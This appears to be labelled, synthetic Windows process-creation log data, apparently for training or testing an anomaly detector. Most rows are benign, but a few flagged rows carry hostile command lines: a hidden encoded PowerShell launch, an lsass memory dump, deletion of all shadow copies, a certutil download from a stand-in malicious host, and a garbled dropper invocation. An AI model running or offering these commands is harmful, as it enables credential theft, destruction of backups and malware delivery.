+1,2026-05-01T06:24:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_hXgT.docx,1,0.10180198373349436,False
+1,2026-05-01T06:31:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=7241,1,0.02567831268370424,False
+1,2026-05-01T06:31:13.759247,powershell.exe,cmd.exe,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...,-1,-0.18986920505710936,True
+1,2026-05-01T06:33:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06915121236748945,False
+1,2026-05-01T06:33:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_TR2v.docx,1,0.10180198373349436,False
+1,2026-05-01T06:35:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.08748643294190317,False
+1,2026-05-01T06:36:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07813334776548453,False
+1,2026-05-01T06:40:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_kXFS.xlsx,1,0.07575250281245649,False
+1,2026-05-01T06:41:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06915121236748945,False
+1,2026-05-01T06:46:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_cWXQ.docx,1,0.10180198373349436,False
+1,2026-05-01T06:47:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_co5c.docx,1,0.10180198373349436,False
+1,2026-05-01T06:52:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_CUwz.txt,1,0.09426502400498005,False
+1,2026-05-01T06:54:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07813334776548453,False
+1,2026-05-01T06:55:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_c7Gy.xlsx,1,0.07575250281245649,False
+1,2026-05-01T06:56:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2382,1,0.0476738490546208,False
+1,2026-05-01T07:02:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.08411888486318919,False
+1,2026-05-01T07:08:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9095,1,0.006138030262414107,False
+1,2026-05-01T07:13:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.049920425461710494,False
+1,2026-05-01T07:14:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_fESd.txt,1,0.08804510497592255,False
+1,2026-05-01T07:30:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.049920425461710494,False
+1,2026-05-01T07:31:13.759247,procdump.exe,powershell.exe,procdump.exe -accepteula -ma lsass.exe lsass.dmp,-1,-0.14950140218080987,True
+1,2026-05-01T07:33:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9667,1,0.006138030262414107,False
+1,2026-05-01T07:34:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_VIMT.txt,1,0.08804510497592255,False
+1,2026-05-01T07:34:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=5154,1,0.035244619180131775,False
+1,2026-05-01T07:37:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8032,1,0.035244619180131775,False
+1,2026-05-01T07:43:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06434886493020076,False
+1,2026-05-01T07:46:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.0623716868488301,False
+1,2026-05-01T07:48:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_KJuP.txt,1,0.08804510497592255,False
+1,2026-05-01T07:57:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_W71m.docx,1,0.08792571908210611,False
+1,2026-05-01T07:57:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_zObQ.docx,1,0.08792571908210611,False
+1,2026-05-01T07:58:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_vLRv.xlsx,1,0.0648554945211649,False
+1,2026-05-01T07:58:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.049920425461710494,False
+1,2026-05-01T07:59:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.08411888486318919,False
+1,2026-05-01T08:01:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0768370888572496,False
+1,2026-05-01T08:01:13.759247,vssadmin.exe,cmd.exe,vssadmin.exe delete shadows /all /quiet,-1,-0.1491910084374919,True
+1,2026-05-01T08:05:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0768370888572496,False
+1,2026-05-01T08:05:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_l43t.txt,1,0.06571442920956483,False
+1,2026-05-01T08:08:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06968352939945965,False
+1,2026-05-01T08:11:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_mc5Y.docx,1,0.06536204232139642,False
+1,2026-05-01T08:12:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_SesO.xlsx,1,0.05020045127856121,False
+1,2026-05-01T08:14:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06968352939945965,False
+1,2026-05-01T08:14:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.04666175317282528,False
+1,2026-05-01T08:18:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_hbxf.docx,1,0.06536204232139642,False
+1,2026-05-01T08:18:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_mEHg.xlsx,1,0.05020045127856121,False
+1,2026-05-01T08:21:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_SUSQ.docx,1,0.06536204232139642,False
+1,2026-05-01T08:21:13.759247,certutil.exe,cmd.exe,certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe,-1,-0.15720284669696072,True
+1,2026-05-01T08:24:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06968352939945965,False
+1,2026-05-01T08:26:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06968352939945965,False
+1,2026-05-01T08:27:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06968352939945965,False
+1,2026-05-01T08:27:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_e0g5.txt,1,0.06571442920956483,False
+1,2026-05-01T08:29:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0768370888572496,False
+1,2026-05-01T08:29:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.04666175317282528,False
+1,2026-05-01T08:30:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0768370888572496,False
+1,2026-05-01T08:31:13.759247,unknown_dropper.exe,explorer.exe,"unknown_dropper.exe @![}/;,&&&]-))}}}>*),(#{-*/[,.%&$&&*<?%%}&-<>,</=' {malicious_payload_9y53YiooziV87k6xNMh0I1hLL0bY4SMtLruBPPBtNdMZiihbyA9gjpibWfa7jZyVLQyfGHnoYuDbYHl955DYiIsOn9jhvW6u5sWS} --silent --bypass --obfuscate (/{{']@]+_>_[(#*-@;*",-1,-0.2288575032653396,True
